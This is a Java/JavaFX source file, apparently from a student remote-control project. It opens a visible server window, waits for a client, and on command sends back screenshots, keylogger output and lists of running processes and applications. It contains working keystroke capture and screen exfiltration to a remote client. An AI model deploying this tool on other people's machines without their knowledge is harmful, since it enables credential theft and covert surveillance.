package application;

import java.net.*;
import java.io.*;
import java.awt.AWTException;
import java.util.Optional;							//import Optional
import javafx.application.Application;
import javafx.application.Platform;
import javafx.stage.Stage;
import javafx.scene.Node;							//import Node
import javafx.scene.Scene;
import javafx.scene.layout.GridPane;				//import GridPane
import javafx.geometry.Insets;
import javafx.scene.control.*;						//import thay cho tất cả control.<...>
import javafx.scene.layout.VBox;

public class Server extends Application
{
	Stage window;
	Scene scene2, scene3;
	int nPort;
	
	public static ServerSocket server = null;
	public static Socket socket = null;
    
    public BufferedReader fromClient;
    public static BufferedWriter toClient;
    static DataOutputStream dataSend;
	
	@Override
	public void start(Stage MainStage) throws UnknownHostException
	{
		window = MainStage;
	//STAGE: GET PORT:
		//Tạo Dialog
		Dialog<String> dialog1 = new Dialog<>();
		dialog1.setTitle("Input Port");
		dialog1.setHeaderText("Port ####:");
		
		//Tạo Button
		ButtonType DoneButton = new ButtonType("Connect", ButtonBar.ButtonData.OK_DONE);
		dialog1.getDialogPane().getButtonTypes().addAll(DoneButton, ButtonType.CANCEL);
		
		//Tạo GRID
		GridPane grid1 = new GridPane();	//Tạo grip để nhập dữ liệu
		grid1.setHgap(10);					//Set khoảng cách chiều ngang
		grid1.setVgap(10);					//Set khoảng cách chiều dọc
		grid1.setPadding(new Insets(20, 150, 10, 10));
		
		//Tạo phần nhập dữ liệu
		TextField Port = new TextField();
		Port.setPromptText("Port:");
		
		//Thêm vào grid
		grid1.add(new Label("Port:"), 0, 0); //Thêm label IP vào cột 0 hàng 0
		grid1.add(Port, 1, 0);				 //Thêm phần nhập IP vào cột 1 hàng 0
		
		Node NodeDoneButton = dialog1.getDialogPane().lookupButton(DoneButton); //Lấy buttonType DoneButton ra
		NodeDoneButton.setDisable(true);										//Tắt button đến khi nhập
		
		//EventHandler cho IP input
		Port.textProperty().addListener((observable, oldValue, newValue) -> {
			NodeDoneButton.setDisable(newValue.trim().isEmpty());
		} );
		
		//Đưa grid vào Dialog1
		dialog1.getDialogPane().setContent(grid1);
		
		//Lấy giá trị trả về của Dialog
		dialog1.setResultConverter(dialogButton -> {
			if (dialogButton == DoneButton)
				return (Port.getText());
			return null;
		});
		
		Optional<String> result = dialog1.showAndWait();
		result.ifPresent(ipaddress -> {
			nPort = Integer.parseInt(ipaddress);
		});	
		
	//STAGE: WAITING FOR CONNECTION
		window.setTitle("Server");
		VBox layout1 = new VBox();
		Label label1 = new Label("Server started, waiting for a client...");
		Label label2 = new Label("Sever IP: "+Inet4Address.getLocalHost().getHostAddress()+"\nPort: "+nPort);
		layout1.getChildren().addAll(label1, label2);
		scene2 = new Scene(layout1, 300, 100);
		window.setScene(scene2);
		//Kiểm tra điều kiện của Port nhập vào
		if (nPort==0)			
		{
			Platform.exit();
			System.exit(0);
		}
		window.show();
		
	//STAGE: CONNECTED
		window.setTitle("Server");
		VBox layout2 = new VBox();
		Label label3 = new Label("Connected");
		layout2.getChildren().addAll(label3);
		scene3 = new Scene(layout2, 300, 100);
		
	//CONNECTED
		new Thread(new Runnable(){
		    public void run(){
			    try
			    {
			    	//Khởi tạo sever với nPort
			        StartServer(nPort);
			        
			        //Thông báo đã kết nối, chuyển sang stage: connected
			        Platform.runLater(()-> {
			        	window.setScene(scene3); });
			        
			    //CONTROL STUFF===================================================================
			        String cmm = "";
			        fromClient = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			        //Send Image
			        OutputStream toClient_i = socket.getOutputStream();
			        BufferedInputStream bis;
			        
			        while (!cmm.equals("Over_Over"))
			        {
			            try
			            {
			                cmm = fromClient.readLine();
			                Control.CommandControl(cmm);
			                //
			                //
			                String[] cmmarr = cmm.split("_");
			                
			                //Send Image
			                if (cmmarr[0].equals("scrshot"))
			                {
			                	File scr_img = new File("C:\\Users\\Public\\Pictures\\scr.jpg");
			                	byte[] i = new byte[((int) scr_img.length())];
			                	bis = new BufferedInputStream(new FileInputStream(scr_img));
			                	bis.read(i, 0, i.length);
			                	toClient_i.write(i, 0, i.length);
			    				toClient_i.flush();
			                }
			                //Send Keylog
			                if ((cmmarr[0].equals("keylog")) && (cmmarr[1].equals("on"))) 
			                {
			                	KeyLogger.KeyLogger();
			                	while (!cmm.equals("keylog_off_unac"))
			                	{ 
			                		cmm = fromClient.readLine();
			                	}
			                	KeyLogger.TurnOffKeyLogger();
			                }
			                
			                //Send ProcessList
			                if (cmmarr[0].equals("process-get"))
			                {
			            		try
			            		{
			            		    String line;
			            		    Process p = Runtime.getRuntime().exec("tasklist.exe");
			            		    BufferedReader prcList = new BufferedReader(new InputStreamReader(p.getInputStream()));
			            		    while ((line = prcList.readLine()) != null) {
			            		        dataSend.writeUTF(line);
			            		    }
			            		    dataSend.writeUTF("End_of_process_list");
			            		    prcList.close();
			            		} catch (Exception err) {
			            		    err.printStackTrace();
			            		}
			                }
			                //Send ApplicationList
			                if (cmmarr[0].equals("Application-get"))
			                {
			            		try
			            		{
			            		    String line = "";
			            		    String cmds = "powershell.exe Get-Process | where{$_.MainWindowTitle -ne ''} | Select ProcessName,Id,MainWindowTitle | Format-Table";
			            		    //Select MainWindowTitle,ProcessName,Id | where{$_.MainWindowTitle -ne \"\"} |
			            		    Process a = Runtime.getRuntime().exec(cmds);
			            		    
			            		    BufferedReader appList = new BufferedReader(new InputStreamReader(a.getInputStream()));
			            		    while ((line = appList.readLine()) != null) {
			            		        System.out.println(line);
			            		    	dataSend.writeUTF(line);
			            		    }
			            		    dataSend.writeUTF("End_of_application_list");
			            		    appList.close();
			            		}
			            		catch (Exception err)
			            		{
			            		    err.printStackTrace();
			            		}
			                }
			            }
			            catch(IOException i)
			            {
			                System.out.println(i);
			            }
			            catch (AWTException e)
			            {
							e.printStackTrace();
						}
			        }
			        //END OF CONTROL STUFF============================================================
			        
			        // close connection
			        System.out.println("Closing connection");
			        socket.close();
			        fromClient.close();
			        Platform.exit();
			    }
			    catch(IOException i)
			    {
			        System.out.println(i);
			    }
			}	
		}).start();		
	}
	
	//Method1: Khởi động sever, chờ accept, khởi tạo các biến nhận, gửi dữ liệu
	public static void StartServer(int nport)
	{
		try
		{
			server = new ServerSocket(nport);
			socket = server.accept();
			//toClient = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
			OutputStream out = socket.getOutputStream();
			dataSend = new DataOutputStream(out);
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
	}
	
	//Method2: Gửi dữ liệu Keylog
	public static void SendKey(String keylog, int mode)
	{
		try
		{
			if (mode==0)
			{
				dataSend.writeUTF("OffKey");
				dataSend.flush();
				//dataSend.close();
			}
			else
			{
				dataSend.writeUTF(keylog);
			}
		}
		catch (IOException e)
		{
				e.printStackTrace();
		}
	}
	
	//MAIN
	public static void main(String args[])
	{
		launch(args);
	}
}
